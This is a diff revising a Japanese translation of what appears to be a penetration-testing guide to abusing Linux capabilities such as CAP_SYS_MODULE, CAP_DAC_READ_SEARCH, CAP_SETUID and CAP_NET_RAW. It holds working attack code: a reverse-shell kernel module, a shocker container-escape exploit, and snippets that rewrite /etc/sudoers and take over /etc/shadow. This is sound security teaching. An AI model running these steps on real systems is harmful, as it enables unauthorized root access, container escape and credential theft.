-デフォルトでは、**`modprobe`** command はディレクトリ **`/lib/modules/$(uname -r)`** 内の dependency list と map files を確認します。\
-これを悪用するため、偽の **lib/modules** folder を作成します：
+デフォルトでは、**`modprobe`** コマンドはディレクトリ **`/lib/modules/$(uname -r)`** 内の依存関係リストおよびマップファイルを確認します。\
+これを悪用するため、偽の **lib/modules** フォルダーを作成します：
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
-次に、**以下にある2つの例の kernel module を compile し、この folder にコピー**します:
+その後、以下にある2つの例のkernel moduleを**compileして、このフォルダにcopy**します:
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-最後に、この kernel module をロードするために必要な Python code を実行します：
+最後に、この kernel module を読み込むために必要な python code を実行します。
 ```python
 import kmod
 km = kmod.Kmod()
 km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
 km.modprobe("reverse-shell")
 ```
-**binaryを使った例2**
+**binaryを使用した例2**
 
-次の例では、binary **`kmod`** にこのcapabilityがあります。
+次の例では、binary **`kmod`** にこの capability が付与されています。
 ```bash
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
-つまり、**`insmod`** コマンドを使用して kernel module を挿入できます。以下の例に従い、この privilege を悪用して **reverse shell** を取得してください。
+これは、コマンド **`insmod`** を使用して kernel module を挿入できることを意味します。この権限を悪用して **reverse shell** を取得するには、以下の例に従ってください。
 
-**Example with environment (Docker breakout)**
+**環境を使用した例（Docker breakout）**
 
-以下を使用すると、docker container 内で有効な capabilities を確認できます。
+以下を使用して、docker container 内で有効な capabilities を確認できます。
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -668,9 +648,9 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-先ほどの出力から、**SYS_MODULE** capability が有効になっていることがわかります。
+Inside the previous output you can see that the **SYS_MODULE** capability is enabled.<sup>[[14]](#references)</sup>
 
-reverse shellを実行する**kernel module**と、それを**compile**するための**Makefile**を**作成**します:
+**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:
 ```c:reverse-shell.c
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -705,7 +685,7 @@ clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
 > [!WARNING]
-> Makefile 内の各 make 命令の前の空白文字は、スペースではなく**タブでなければなりません**！
+> Makefile 内の各 `make` コマンドの前の空白文字は、スペースではなく**タブ**でなければなりません！
 
 `make` を実行してコンパイルします。
 ```bash
@@ -714,7 +694,7 @@ Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  
 sudo apt update
 sudo apt full-upgrade
 ```
-最後に、shell 内で `nc` を起動し、別の shell から **load the module** すると、nc process 内の shell を取得できます。
+最後に、shell 内で `nc` を起動し、別の shell から **module をロード**すると、nc プロセス内で shell を取得できます。
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -722,27 +702,27 @@ nc -lvnp 4444
 #Shell 2
 insmod reverse-shell.ko #Launch the reverse shell
 ```
-**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>** の「Abusing SYS_MODULE Capability」laboratoryからコピーされました**
+**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「Abusing SYS_MODULE Capability」の laboratory からコピーされました。**<sup>[[1]](#references)</sup>
 
 この technique の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) にあります。
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、process が**file の読み取り、および directory の読み取りと実行に関する permission を bypass する**ことを可能にします。主な用途は、file の検索または読み取りです。ただし、process が `open_by_handle_at(2)` function を使用することも可能にします。この function は、process の mount namespace 外にある file を含む、あらゆる file にアクセスできます。`open_by_handle_at(2)` で使用される handle は、`name_to_handle_at(2)` によって取得される non-transparent な identifier であることが想定されていますが、改ざんに対して脆弱な inode number などの機密情報を含む場合があります。特に Docker container の context における、この capability の exploit の可能性は、Sebastian Krahmer による shocker exploit によって実証されており、[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で分析されています。<sup>[[12]](#references)[[13]](#references)</sup>
-**これは、file の読み取り permission check と directory の読み取り・実行 permission check を** **bypass できることを意味します。**
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) により、process は **file の読み取り、および directory の読み取りと実行に関する permission を bypass** できます。主な用途は、file の検索または読み取りです。ただし、process が `open_by_handle_at(2)` function を使用することも可能になります。この function は、process の mount namespace 外にある file を含め、あらゆる file にアクセスできます。`open_by_handle_at(2)` で使用される handle は、`name_to_handle_at(2)` で取得される非透過的な identifier であることが想定されていますが、改ざんに対して脆弱な inode number などの機密情報を含めることができます。この capability の exploit の可能性は、特に Docker container の context において、Sebastian Krahmer が作成した shocker exploit によって実証されており、[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) で分析されています。<sup>[[12]](#references)[[13]](#references)</sup>
+**これは、file の read permission check と directory の read/execute permission check を bypass できることを意味します**。<sup>[[14]](#references)</sup>
 
 **binary の例**
 
-binary はあらゆる file を読み取れるようになります。そのため、tar のような file にこの capability がある場合、shadow file を読み取ることができます。
+binary は、その namespace からアクセス可能な file を読み取ることができます。したがって、`tar` のような file にこの capability がある場合、shadow file を読み取ることができます：
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
 cd /tmp
 tar -cxf shadow.tar.gz
 ```
-**binary2を使ったExample**
+**binary2を使った例**
 
-この場合、**`python`** binary にこの capability があるとします。root files を一覧表示するには、次のように実行できます。
+この場合、**`python`** binaryにこのcapabilityがあると仮定します。root filesを一覧表示するには、次のように実行できます:
 ```python
 import os
 for r, d, f in os.walk('/root'):
@@ -753,9 +733,9 @@ print(filename)
 ```python
 print(open("/etc/shadow", "r").read())
 ```
-**環境内の例（Docker breakout）**
+**環境での例（Docker breakout）**
 
-以下を使用して、docker container 内で有効な capabilities を確認できます。
+`capsh --print` を使用すると、Docker コンテナ内で有効な capabilities を確認できます。<sup>[[14]](#references)[[26]](#references)</sup>
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -768,11 +748,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-前の出力では、**DAC_READ_SEARCH** capability が有効になっていることが確認できます。その結果、container は**プロセスを debug**できます。
+前の出力では、**DAC_READ_SEARCH** capability が有効になっていることが確認できます。これは DAC の read/search チェックを bypass し、`open_by_handle_at(2)` を許可します。ただし、それ自体は process-debugging capability ではありません。<sup>[[14]](#references)</sup>
 
-以下の exploit の仕組みについては、[https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で学ぶことができますが、要約すると、**CAP_DAC_READ_SEARCH**は permission check なしで file system を横断できるだけでなく、_**open_by_handle_at(2)**_ に対するあらゆる check を明示的に削除し、**他の process によって open された sensitive file に process からアクセスできる可能性があります**。<sup>[[13]](#references)</sup>
+次の exploit の仕組みについては、[https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) で確認できます。簡単に説明すると、**CAP_DAC_READ_SEARCH** により permission checks なしで file system を traverse でき、`open_by_handle_at(2)` も許可されます。これにより、関連する namespaces と mounts に到達できる場合、他の processes が開いた files を expose できます。<sup>[[13]](#references)[[14]](#references)</sup>
 
-この permission を悪用して host から file を読み取る original exploit は、[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)にあります。以下は、**読み取りたい file を第1引数で指定し、その内容を file に dump できる modified version です。**<sup>[[12]](#references)</sup>
+これらの permissions を悪用して host から files を read する元の exploit は、こちらにあります: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)。以下は、read する file を first argument として渡し、結果を file に dump できる **modified version** です。<sup>[[12]](#references)</sup>
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -923,53 +903,42 @@ return 0;
 }
 ```
 > [!WARNING]
-> exploit は host 上で mount されているものへの pointer を見つける必要があります。元の exploit ではファイル `/.dockerinit` を使用していましたが、この modified version では `/etc/hostname` を使用します。exploit が動作しない場合は、別のファイルを設定する必要があるかもしれません。host 上で mount されているファイルを見つけるには、mount command を実行します。
+> exploit はホスト上に mount された何かへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この modified version では /etc/hostname を使用します。exploit が動作しない場合は、別のファイルを設定する必要があるかもしれません。ホスト上に mount されたファイルを見つけるには、mount command を実行します。
 
-![CAP SYS MODULE - CAP DAC READ SEARCH: exploit は host 上で mount されているものへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この modified version では...](<../../images/image (407) (1).png>)
+![CAP SYS MODULE - CAP DAC READ SEARCH: exploit はホスト上に mount された何かへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この modified version では...](<../../images/image (407) (1).png>)
 
-**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)** の「Abusing DAC_READ_SEARCH Capability」laboratory からコピーされています。**<sup>[[1]](#references)</sup>
+**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「Abusing DAC_READ_SEARCH Capability」laboratory からコピーされています。**<sup>[[1]](#references)</sup>
 
 
 ## CAP_DAC_OVERRIDE
 
-**これは、あらゆるファイルに対する write permission checks を bypass できるという意味なので、任意のファイルに書き込めます。**
+**この capability は、ファイルの read、write、execute permission checks を bypass します。**<sup>[[14]](#references)</sup>
 
-**privileges を escalate するために overwrite できるファイルは多数あります。**[**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
+privileged group の membership によって readable または writable になるファイルを探します。有用な target は、target の ownership と mode bits によって異なります。<sup>[[14]](#references)</sup>
 
 **binary の例**
 
-この例では vim にこの capability があるため、_passwd_、_sudoers_、または _shadow_ などの任意のファイルを変更できます。
+この例では vim にこの capability があるため、_passwd_、_sudoers_、_shadow_ などの任意のファイルを変更できます。
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/vim = cap_dac_override+ep
 
 vim /etc/sudoers #To overwrite it
 ```
-**バイナリを使った例 2**
+**binary 2 を使った例**
 
-この例では、**`python`** バイナリにこの capability が付与されています。python を使用して、任意のファイルを上書きできます。
+この例では、**`python`** binary にこの capability が付与されています。python を使って任意のファイルを上書きできます：
 ```python
 file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
-**environment + CAP_DAC_READ_SEARCH の例（Docker breakout）**
+**environment + CAP_DAC_READ_SEARCH (Docker breakout) の例**
 
-Docker container 内で有効な capabilities は、次のコマンドで確認できます。
-```bash
-capsh --print
-Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
-Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
-Securebits: 00/0x0/1'b0
-secure-noroot: no (unlocked)
-secure-no-suid-fixup: no (unlocked)
-secure-keep-caps: no (unlocked)
-uid=0(root)
-gid=0(root)
-groups=0(root)
-```
-まず、ホスト上の[**DAC_READ_SEARCH capabilityを悪用して任意のファイルを読み取る**](linux-capabilities.md#cap_dac_read_search)前のセクションを読み、**exploitをcompile**してください。\
-次に、ホストのファイルシステム内に**任意のファイルを書き込める**ようにする、以下のバージョンの**shocker exploitをcompile**してください：
+前述の `CAP_DAC_READ_SEARCH` environment の例に示したように、`capsh --print` で `CAP_DAC_OVERRIDE` を確認します。<sup>[[14]](#references)[[26]](#references)</sup>
+
+まず、ホストの任意のファイルを読み取るために [**DAC_READ_SEARCH capability を悪用する**](linux-capabilities.md#cap_dac_read_search) 前のセクションを読み、exploit を **compile** します。\
+次に、ホストのファイルシステム内に**任意のファイルを書き込める** **shocker exploit の次のバージョンを compile** します:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1108,39 +1077,39 @@ close(fd1);
 return 0;
 }
 ```
-Docker containerから**escape**するには、hostから`/etc/shadow`と`/etc/passwd`ファイルを**download**し、それらに**new user**を**add**して、**`shocker_write`**を使って上書きできます。その後、**ssh**経由で**access**します。
+Docker containerから**escape**するには、hostから`/etc/shadow`と`/etc/passwd`ファイルを**download**し、そこに**new user**を**add**して、`shocker_write`を使用してそれらを上書きできます。その後、**ssh**経由で**access**します。
 
-**このtechniqueのcodeは、"Abusing DAC_OVERRIDE Capability"のlaboratoryからコピーしたものです** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>
+**このtechniqueのcodeは、**[**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)の「Abusing DAC_OVERRIDE Capability」laboratoryからコピーされました。<sup>[[1]](#references)</sup>
 
 ## CAP_CHOWN
 
-**これは、任意のファイルのownershipを変更できるという意味です。**
+**このcapabilityにより、processはfilesのownershipを変更できます**。<sup>[[14]](#references)</sup>
 
-**binaryを使ったExample**
+**binaryを使用したExample**
 
-**`python`** binaryにこのcapabilityがあると仮定します。この場合、**shadow**ファイルの**owner**を**change**し、**root password**を**change**して、privilegesをescalateできます。
+**`python`** binaryにこのcapabilityがあるとします。**`shadow`**などのfileのownerを変更し、その後、他のpermissionsが許可していれば、得られたaccessを使用してfileをmodifyできます。
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
-または、**`ruby`** バイナリがこの capability を持っている場合:
+または、**`ruby`** binary がこの capability を持っている場合:
 ```bash
 ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
 ## CAP_FOWNER
 
-**これは、任意のファイルの permission を変更できるということです。**
+**この capability は、権限の変更を含む多くのファイル操作で所有権チェックをバイパスします**。<sup>[[14]](#references)</sup>
 
-**バイナリを使った例**
+**binary を使った例**
 
-Python にこの capability がある場合、shadow file の permission を変更し、**root password を変更**して、権限昇格できます。
+python にこの capability がある場合、shadow file の権限を変更し、**root password を変更**して、privileges を escalate できます。
 ```bash
-python -c 'import os;os.chmod("/etc/shadow",0666)
+python -c 'import os; os.chmod("/etc/shadow", 0o666)'
 ```
 ### CAP_SETUID
 
-**これは、作成されたプロセスの effective user id を設定できるという意味です。**
+**この capability により、プロセスは、kernel によって適用される credential および capability のルールに従って、自身の実効ユーザー ID を変更できます**。<sup>[[14]](#references)</sup>
 
-**binary を使った例**
+**binary の例**
 
 python にこの **capability** がある場合、これを非常に簡単に悪用して root へ privilege escalation できます:
 ```python
@@ -1159,13 +1128,13 @@ os.system("/bin/bash")
 ```
 ## CAP_SETGID
 
-**これは、作成されたプロセスの有効グループIDを設定できるという意味です。**
+**この capability により、kernel によって適用される credential および capability のルールに従って、process は effective group ID を変更できます**。<sup>[[14]](#references)</sup>
 
-**権限を昇格するために overwrite できるファイルは多数あります。** [**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
+**privileges を escalate するために overwrite できるファイルは多数存在します。** [**こちらからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
 
-**バイナリの例**
+**binary の例**
 
-この場合、任意のグループになりすませるため、グループが読み取り可能な興味深いファイルを探す必要があります。
+この場合、任意の group になりすませるため、group が read できる興味深いファイルを探します。
 ```bash
 #Find every file writable by a group
 find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
@@ -1174,22 +1143,22 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 #Find every file readable by a group in /etc with a maxpath of 1
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
-abuseできるファイル（読み取りまたは書き込みによって）を見つけたら、以下を使って **interesting groupを偽装するshellを取得**できます：
+読み取りまたは書き込みによって privilege escalation に悪用できるファイルを見つけたら、次のコマンドで **対象となるグループになりすました shell を取得**できます：
 ```python
 import os
 os.setgid(42)
 os.system("/bin/bash")
 ```
-この場合、shadow グループになりすますことで、`/etc/shadow` ファイルを読み取れます:
+この場合、shadow グループになりすましたため、ファイル `/etc/shadow` を読み取れます：
 ```bash
 cat /etc/shadow
 ```
 ### Combined chain: CAP_SETGID + CAP_CHOWN
 
-同じ helper で両方の capabilities が利用可能な場合、実用的な chain は次のとおりです。
+両方の capability が同じ helper で利用可能な場合、実用的な chain は次のとおりです。
 
 1. EGID を `shadow`（または別の privileged group）に切り替える。
-2. `/etc/shadow` に対して `chown` を使用し、group を `shadow` のまま UID を自分の UID に設定する。
+2. `chown` を `/etc/shadow` に対して使用し、group を `shadow` のまま UID を自分の UID に設定する。
 3. target hash を読み取り、crack/pivot する。
 ```python
 import os
@@ -1202,17 +1171,17 @@ os.setgid(SHADOW_GID)
 os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
 os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
 ```
-これにより、直接完全な root 権限を必要とせず、credential reuse を介した pivoting に十分なケースが多くあります。
+これは直接完全な root 権限を必要とせず、credential reuse を通じた pivot に十分なことが一般的です。
 
-**docker** がインストールされている場合、**docker group** を **impersonate** し、それを悪用して [**docker socket** と通信し、privileges を escalate](#writable-docker-socket) できます。
+**docker** がインストールされている場合、**docker group** を **impersonate** し、[**docker socket** と通信して privileges を escalate](#writable-docker-socket) するために悪用できます。
 
 ## CAP_SETFCAP
 
-**これは、files と processes に capabilities を設定できることを意味します**
+**この capability により、process は file capabilities を設定できます**。<sup>[[14]](#references)</sup>
 
-**binary の例**
+**バイナリを使った例**
 
-python にこの **capability** がある場合、それを非常に簡単に悪用して privileges を root まで escalate できます：
+python がこの **capability** を持っている場合、これを非常に簡単に悪用して root へ privileges を escalate できます:
 ```python:setcapability.py
 import ctypes, sys
 
@@ -1240,13 +1209,14 @@ print (cap + " was successfully added to " + path)
 python setcapability.py /usr/bin/python2.7
 ```
 > [!WARNING]
-> CAP_SETFCAP を使って binary に新しい capability を設定すると、この cap を失うことに注意してください。
+> 新しく書き込まれた file capability set は以前の set を置き換えます。そのため、helper が新しい capabilities のみで実行されると、別の file を更新するための `CAP_SETFCAP` を保持できなくなる可能性があります。<sup>[[14]](#references)[[25]](#references)</sup>
 
-[SETUID capability](linux-capabilities.md#cap_setuid) を取得したら、そのセクションで privilege escalation の方法を確認できます。
+[SETUID capability](linux-capabilities.md#cap_setuid) を取得したら、そのセクションで privileges を escalate する方法を確認できます。
 
-**Example with environment (Docker breakout)**
+**環境を使用した例（Docker breakout）**
 
-デフォルトでは、Docker の **container 内の process には CAP_SETFCAP capability が付与されています**。次のように実行して確認できます:
+Docker に記載されているデフォルトの capability set には **CAP_SETFCAP** が含まれていますが、実際の set は runtime configuration に依存します。<sup>[[19]](#references)</sup>
+以下のコマンドで process capabilities を確認できます：
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
 CapInh: 00000000a80425fb
@@ -1258,8 +1228,7 @@ CapAmb: 0000000000000000
 capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-この capability により、**バイナリに他の任意の capability を付与できる**ため、このページで説明している**他の capability breakout を悪用して**コンテナから**escaping**できるのではないかと考えられます。\
-しかし、たとえば gdb バイナリに CAP_SYS_ADMIN と CAP_SYS_PTRACE の capability を付与しようとすると、付与自体はできますが、その後**バイナリを実行できなくなります**：
+この capability により file capabilities の書き込みが可能になりますが、それ自体は、現在のプロセスにそれらの capability を付与したり、ファイルの実行時に適用される file、bounding-set、namespace のルールを回避したりするものではありません。<sup>[[14]](#references)</sup>
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1269,25 +1238,21 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
-[docsより](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: これは、threadが引き受けることのできる effective capabilities の**制限付きスーパーセット**です。また、effective set に **CAP_SETPCAP** capability を**持たない**threadによって inheritable set に追加できる capabilities の制限付きスーパーセットでもあります。_\
-Permitted capabilities は、使用できる capabilities を制限しているようです。\
-しかし、Docker はデフォルトで **CAP_SETPCAP** も付与するため、**inheritable set に新しい capabilities を設定**できる可能性があります。\
-ただし、この cap のドキュメントには次のように記載されています: _CAP_SETPCAP : \[…] **calling thread の bounding set にある任意の capability を、その inheritable set に追加する**。_\
-つまり、inheritable set に追加できるのは bounding set にある capabilities だけのようです。したがって、**権限昇格のために CAP_SYS_ADMIN や CAP_SYS_PTRACE のような新しい capabilities を inherit set に追加することはできません**。
+ファイルの許可された capabilities は、process の capability bounding set によって制限されます。また、ファイルの effective bit は、ファイルの permitted set を process の effective set に引き上げるかどうかを制御します。このため、ファイルに capabilities を追加しても、要求されたすべての capability が実行時に自動的に使用可能になるわけではありません。<sup>[[14]](#references)</sup>
 
 ## CAP_SYS_RAWIO
 
-[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`/dev/mem`、`/dev/kmem`、`/proc/kcore` へのアクセス、`mmap_min_addr` の変更、`ioperm(2)` および `iopl(2)` system calls へのアクセス、さまざまな disk commands など、多数のセンシティブな操作を提供します。`FIBMAP ioctl(2)` もこの capability によって有効になりますが、これは[過去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)に問題を引き起こしたことがあります。man page によると、これは holder が `他のデバイス上でデバイス固有のさまざまな操作を実行する`ことも可能にします。
+[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`/dev/mem`、`/dev/kmem`、`/proc/kcore` へのアクセス、`mmap_min_addr` の変更、`ioperm(2)` および `iopl(2)` system call へのアクセス、各種 disk command など、多数の機密性の高い操作を提供します。`FIBMAP ioctl(2)` もこの capability によって有効になりますが、これは[過去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)に問題を引き起こしています。man page によれば、これにより holder は他の device に対して device 固有のさまざまな操作も実行できます。<sup>[[14]](#references)</sup>
 
-これは**権限昇格**や **Docker breakout** に役立つ可能性があります。
+これは **privilege escalation** や **Docker breakout** に利用できます。<sup>[[14]](#references)</sup>
 
 ## CAP_KILL
 
-**これは、任意の process を kill できるという意味です。**
+**この capability は、kernel によって定義されたケースにおいて、process に signal を送信する際の permission check を bypass します**。<sup>[[14]](#references)</sup>
 
-**binary を使った Example**
+**binary を使用した例**
 
-**`python`** binary がこの capability を持っているとします。**service または socket の設定**（あるいは service に関連する任意の設定ファイル）を変更することもできるなら、それを backdoor 化し、その後その service に関連する process を kill して、新しい設定ファイルが backdoor とともに実行されるのを待つことができます。
+**`python`** binary にこの capability があるとします。さらに、**何らかの service または socket configuration**（または service に関連する任意の configuration file）を変更できるなら、それに backdoor を仕込み、その service に関連する process を kill して、新しい configuration file が backdoor 付きで実行されるのを待つことができます。
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1295,9 +1260,9 @@ import signal
 pgid = os.getpgid(341)
 os.killpg(pgid, signal.SIGKILL)
 ```
-**kill による Privesc**
+**Privesc with kill**
 
-kill capabilities があり、**root として実行されている node program**（または別の user として実行されているもの）がある場合、おそらくその **signal SIGUSR1** を **send** して、**node debugger** を **open** させ、そこへ connect できます。
+kill capabilities を持っており、**root として実行されている node program**（または別のユーザーとして実行されている node program）がある場合、そのプログラムに **signal SIGUSR1** を **send** して、接続可能な状態で **node debugger を open** させられる可能性があります。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -1309,11 +1274,11 @@ kill -s SIGUSR1 <nodejs-ps>
 
 ## CAP_NET_BIND_SERVICE
 
-**これは、任意のポート（特権ポートも含む）でlistenできるということです。** このcapabilityだけでは、直接privilege escalationすることはできません。
+**この capability により、1024 未満の Internet ポートに bind できます。** より広範な privilege escalation が直接付与されるわけではありません。<sup>[[14]](#references)</sup>
 
-**binaryを使った例**
+**binary の例**
 
-**`python`**にこのcapabilityがある場合、任意のポートでlistenでき、そこから他の任意のポートへ接続することもできます（一部のserviceでは、特定の特権ポートからの接続が必要です）。
+**`python`** にこの capability がある場合、任意のポートで listen でき、そこから他の任意のポートにも connect できます（サービスによっては、特定の privilege ports からの接続が必要です）。
 
 {{#tabs}}
 {{#tab name="Listen"}}
@@ -1341,20 +1306,22 @@ s.connect(('10.10.10.10',500))
 
 ## CAP_NET_RAW
 
-[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability は、process が **RAW および PACKET sockets を作成**できるようにし、任意の network packets を生成して送信できるようにします。これにより、packet spoofing、traffic injection、network access controls の回避など、containerized environments における security risks につながる可能性があります。悪意のある攻撃者は、これを悪用して container の routing に干渉したり、特に十分な firewall protections がない場合に host network security を侵害したりする可能性があります。さらに、**CAP_NET_RAW** は、RAW ICMP requests による ping などの操作を privileged containers でサポートするために重要です。
+[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) により、process は **RAW および PACKET sockets を作成**でき、任意の network packet を生成して送信できます。これにより、packet spoofing、traffic injection、network access controls の bypass など、containerized environments における security risks につながる可能性があります。悪意のある攻撃者は、これを悪用して container の routing に干渉したり、host network security を侵害したりできます。特に、十分な firewall protections がない場合に危険です。さらに、**CAP_NET_RAW** は RAW ICMP requests による ping などの operations をサポートします。<sup>[[14]](#references)</sup>
 
-**これは traffic を sniff できるということです。** この capability だけで直接 privileges を escalate することはできません。
+**これは、適切な socket interface と組み合わせることで packet capture を可能にします。** これだけで、より広範な privilege escalation が直接可能になるわけではありません。<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**バイナリの例**
 
-binary **`tcpdump`** にこの capability がある場合、network information を capture できます。
+バイナリ **`tcpdump`** にこの capability がある場合、network information を capture できます。
 ```bash
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
-**binary 2を使用した例**
+この **environment** がこの capability を付与している場合、**`tcpdump`** もこれを使用してトラフィックを sniff できます。<sup>[[14]](#references)</sup>
 
-以下の例は、"**lo**"（**localhost**）interfaceのtrafficをinterceptするのに役立つ **`python2`** codeです。このcodeは、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)<sup>[[1]](#references)</sup> のlab "_The Basics: CAP-NET_BIND + NET_RAW_" からのものです。
+**binary 2 を使用した例**
+
+次の例は、"**lo**"（**localhost**）interface のトラフィックを傍受するのに役立つ **`python2`** code です。この code は、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) の lab "_The Basics: CAP-NET_BIND + NET_RAW_" からのものです。<sup>[[1]](#references)</sup>
 ```python
 import socket
 import struct
@@ -1400,11 +1367,11 @@ count=count+1
 ```
 ## CAP_NET_ADMIN + CAP_NET_RAW
 
-[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability は、公開されている network namespaces 内で、firewall settings、routing tables、socket permissions、network interface settings などの **network configurations を変更する**権限を holder に付与します。また、network interfaces の **promiscuous mode** を有効化できるため、namespaces 全体で packet sniffing が可能になります。
+[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、公開されている network namespaces 内で、firewall settings、routing tables、socket permissions、network interface settings などの**network configurations を変更する**権限を holder に付与します。また、network interfaces で **promiscuous mode** を有効にすることも可能になり、namespaces 全体で packet sniffing を行えるようになります。<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**binary を使用した例**
 
-例えば、**python binary** にこれらの capabilities が付与されているとします。
+**python binary** にこれらの capabilities があると仮定します。
 ```python
 #Dump iptables filter table rules
 import iptc
@@ -1418,11 +1385,11 @@ iptc.easy.flush_table('filter')
 ```
 ## CAP_LINUX_IMMUTABLE
 
-**これは、inode属性を変更できることを意味します。** このcapabilityだけで直接privilegesをescalateすることはできません。
+**この capability では、immutable や append-only などの inode フラグを変更できます。** ただし、より広範な privilege escalation が直接許可されるわけではありません。<sup>[[14]](#references)</sup>
 
-**binaryを使用した例**
+**binary を使用した例**
 
-ファイルがimmutableで、pythonにこのcapabilityがある場合、**immutable属性を削除してファイルを変更可能にできます。**
